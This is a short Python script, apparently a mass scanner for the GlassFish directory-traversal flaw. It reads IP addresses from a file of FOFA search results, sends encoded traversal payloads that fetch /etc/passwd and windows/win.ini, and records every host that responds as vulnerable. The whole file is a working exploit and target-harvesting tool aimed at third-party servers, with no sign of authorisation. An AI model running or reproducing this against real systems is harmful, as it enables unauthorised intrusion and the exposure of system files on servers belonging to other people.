import time

import requests

payload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
payload_win = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'


for ip in open('glassfish_fofa_scan/fofa_ips.txt'):
    ip = ip.strip()
    try:
        linux_code = requests.get(ip + payload_linux).status_code
        win_code = requests.get(ip + payload_win).status_code


        if linux_code == 200 or win_code == 200:
            with open(r'glassfish_fofa_scan/vuln.txt', 'a+') as f:
                f.write(ip + '\n')
    except Exception as e:
        pass
    # time.sleep(0.5)
